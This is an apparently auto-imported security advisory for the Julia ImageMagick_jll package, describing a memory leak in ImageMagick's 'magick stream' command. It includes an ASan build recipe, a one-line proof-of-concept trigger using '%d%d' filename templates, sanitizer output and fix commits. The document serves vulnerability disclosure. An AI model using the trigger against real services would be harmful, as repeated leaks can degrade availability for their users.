# [H] ImageMagick has a Memory Leak in magick stream

## Summary
Severity: High
Advisory: JLSEC-2026-917
Ecosystem: Julia
CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
Published: 2026-07-30
Source: https://osv.dev/vulnerability/JLSEC-2026-917
Type: osv

## Affected
- Julia: `ImageMagick_jll` — affected >=0 <7.1.2001+0

## Details
## Summary

In ImageMagick's `magick stream` command, specifying multiple consecutive `%d` format specifiers in a filename template causes a memory leak.

## Details

  - **Vulnerability Type:** Memory leak
  - **Affected Version:** ImageMagick 7.1.1-47 (as of commit 82572afc, June 2025)

## Reproduction

### Tested Environment

  - **Operating System:** Ubuntu 22.04 LTS
  - **Architecture:** x86_64
  - **Compiler:** gcc with AddressSanitizer (gcc version: 11.4.0)

### Reproduction Steps

```bash
# Clone source
git clone --depth 1 --branch 7.1.1-47 https://github.com/ImageMagick/ImageMagick.git ImageMagick-7.1.1
cd ImageMagick-7.1.1

# Build with ASan
CFLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer" CXXFLAGS="$CFLAGS" LDFLAGS="-fsanitize=address" ./configure --enable-maintainer-mode --enable-shared && make -j$(nproc) && make install

# Trigger crash
./utilities/magick stream %d%d a a
```

### Output

```
$ magick stream %d%d a a
stream: no decode delegate for this image format `' @ error/constitute.c/ReadImage/746.
stream: missing an image filename `a' @ error/stream.c/StreamImageCommand/755.

=================================================================
==114==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 152 byte(s) in 1 object(s) allocated from:
    #0 0x7fc4ebe58887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
    #1 0x7fc4eb563c5c in AcquireMagickMemory MagickCore/memory.c:559
    #2 0x7fc4eb563c82 in AcquireCriticalMemory MagickCore/memory.c:635
    #3 0x7fc4eb60c2be in AcquireQuantumInfo MagickCore/quantum.c:119
    #4 0x7fc4eb6b6621 in StreamImage MagickCore/stream.c:1335
    #5 0x7fc4eb09d889 in StreamImageCommand MagickWand/stream.c:292
    #6 0x7fc4eaf1295d in MagickCommandGenesis MagickWand/magick-cli.c:177
    #7 0x55a34f7c0a0c in MagickMain utilities/magick.c:153
    #8 0x55a34f7c0cba in main utilities/magick.c:184
    #9 0x7fc4ea38fd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

Indirect leak of 64 byte(s) in 1 object(s) allocated from:
    #0 0x7fc4ebe5957c in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
    #1 0x7fc4eb680e2f in AcquireSemaphoreMemory MagickCore/semaphore.c:154
    #2 0x7fc4eb680f30 in AcquireSemaphoreInfo MagickCore/semaphore.c:200
    #3 0x7fc4eb60d38d in GetQuantumInfo MagickCore/quantum.c:435
    #4 0x7fc4eb60c30e in AcquireQuantumInfo MagickCore/quantum.c:121
    #5 0x7fc4eb6b6621 in StreamImage MagickCore/stream.c:1335
    #6 0x7fc4eb09d889 in StreamImageCommand MagickWand/stream.c:292
    #7 0x7fc4eaf1295d in MagickCommandGenesis MagickWand/magick-cli.c:177
    #8 0x55a34f7c0a0c in MagickMain utilities/magick.c:153
    #9 0x55a34f7c0cba in main utilities/magick.c:184
    #10 0x7fc4ea38fd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: 216 byte(s) leaked in 2 allocation(s).
```

### Commits

Fixed in https://github.com/ImageMagick/ImageMagick/commit/fc3ab0812edef903bbb2473c0ee652ddfd04fe5c and https://github.com/ImageMagick/ImageMagick6/commit/d49460522669232159c2269fa64f73ed30555c1b

## References
- https://github.com/ImageMagick/ImageMagick/commit/fc3ab0812edef903bbb2473c0ee652ddfd04fe5c
- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-cfh4-9f7v-fhrc
- https://github.com/ImageMagick/ImageMagick6/commit/d49460522669232159c2269fa64f73ed30555c1b
- https://github.com/advisories/GHSA-cfh4-9f7v-fhrc
- https://github.com/dlemstra/Magick.NET/releases/tag/14.7.0
- https://lists.debian.org/debian-lts-announce/2025/09/msg00012.html
- https://nvd.nist.gov/vuln/detail/CVE-2025-53019
